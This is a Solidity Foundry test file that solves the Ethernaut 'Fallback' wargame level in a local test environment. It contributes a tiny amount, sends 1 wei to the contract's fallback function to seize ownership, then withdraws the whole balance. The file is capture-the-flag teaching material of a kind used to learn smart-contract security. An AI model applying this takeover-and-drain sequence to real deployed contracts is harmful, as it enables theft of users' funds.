pragma solidity ^0.8.17;

import "ds-test/test.sol";

import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

import "./utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Fund the eoa address
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        // use eoa address
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // START
        // contribute less than 0.001 ether
        ethernautFallback.contribute{value: 0.0005 ether}();
        assertEq(ethernautFallback.getContribution(), 0.0005 ether);

        // call fallback function
        (bool success,) = payable(ethernautFallback).call{value: 1 wei}("");
        assert(success);
        assertEq(ethernautFallback.owner(), eoaAddress);

        // drain the balance
        ethernautFallback.withdraw();
        assertEq(address(ethernautFallback).balance, 0);
        // END

        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}